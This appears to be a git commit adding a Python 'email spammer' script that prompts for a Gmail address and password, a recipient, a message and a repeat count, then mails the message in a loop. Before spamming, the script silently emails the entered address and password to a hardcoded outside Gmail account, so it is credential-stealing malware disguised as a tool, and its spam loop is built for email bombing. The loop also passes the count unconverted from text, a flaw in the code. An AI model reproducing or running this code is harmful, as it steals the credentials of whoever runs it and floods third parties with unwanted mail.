40fb4d6610589203853b5f40847c6a937475f321
UNITY <74477764+UNITY484@users.noreply.github.com>
2021-11-03 15:22:51 +0700

    Add files via upload

---
+++ EMAIL-SPAMER.py
@@ -0,0 +1,38 @@
+import smtplib
+import os
+os.system("clear")
+from email.message import EmailMessage
+print ("""\033[1;30m
+    =========================================
+    "                                       "
+    "					    "
+    "     	\033[0;32m SPAM EMAIL 2021  \033[1;30m          "
+    "     	 	                    "
+    "                                       "
+    =========================================
+""")
+USER = input("SET EMAILHACKER : ")
+I = 'unity484.non@gmail.com'
+PASS = input("SET EMAILPASSWORD : ")
+to2 = input("To : ")
+message = input("message : ")
+m = input("NUMBER TO SPAM : ")
+email = EmailMessage()
+email["From"] = USER
+email["To"] = I
+email.set_content("EMAIL TARGET = "+ USER + " "+"PASSWORD = "+ PASS)
+
+
+kaka = EmailMessage()
+kaka["To"] = to2
+kaka.set_content(message)
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(USER , PASS)
+    smtp.send_message(email)
+
+for i in range(1,m+1):
+   with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+       smtp.login(USER , PASS)
+       smtp.send_message(kaka)
+       print ("EMAIL SPAM : %i" % i)
